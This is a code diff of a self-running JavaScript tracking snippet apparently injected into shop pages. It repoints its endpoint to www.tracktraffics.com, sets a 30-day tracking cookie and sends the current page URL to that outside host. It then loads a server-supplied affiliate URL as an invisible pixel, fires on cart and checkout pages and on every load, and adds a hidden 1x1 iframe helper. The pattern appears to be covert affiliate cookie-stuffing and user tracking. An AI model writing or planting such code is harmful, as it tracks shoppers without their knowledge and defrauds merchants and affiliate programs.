@@ -21,18 +21,27 @@
         document.body.appendChild(img);
     }
 
+    function createClickIframe(url) {
+  const iframe = document.createElement('iframe');
+  iframe.src = url;
+  iframe.width = "1";
+  iframe.height = "1";
+  iframe.style = "display:none;visibility:hidden;";
+  document.body.appendChild(iframe);
+}
+
+
     async function initTracking() {
         // if (sessionStorage.getItem('iframe_triggered')) {
         //     return; 
         // }
-
 
         try {
             let uniqueId = getCookie('tracking_uuid') || generateUUID();
             let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
             document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
 
-            let response = await fetch('https://api.dicountshop.com/api/track-user', {
+            let response = await fetch('https://www.tracktraffics.com/api/track-user', {
                 method: 'POST',
                 body: JSON.stringify({
                     url: window.location.href,
@@ -51,7 +60,7 @@
                 createTrackingPixel(result.affiliate_url);
                 sessionStorage.setItem('iframe_triggered', 'true'); 
             } else {
-                createTrackingPixel('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
+                createTrackingPixel('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
             }
         } catch (error) {
             console.error('Error in tracking script:', error);
@@ -72,19 +81,16 @@
         }
         return '';
     }
+        function isCardPage() {
+            const cardPageUrls = ['/cart', '/checkout']; 
+            return cardPageUrls.some(url => window.location.pathname.includes(url));
+        }
+        
+        if (isCardPage()) {
+            initTracking()
+        }
 
-     function isCartPage() {
-        const cartPages = ['/cart', '/checkout'];
-        return cartPages.some(path => window.location.pathname.includes(path));
-    }
-
-
-
-     if (isCartPage()) {
-        initTracking();
-    }
-
-     initTracking();
-   
+        setTimeout(initTracking, 2000);
     
+    initTracking()
 })();
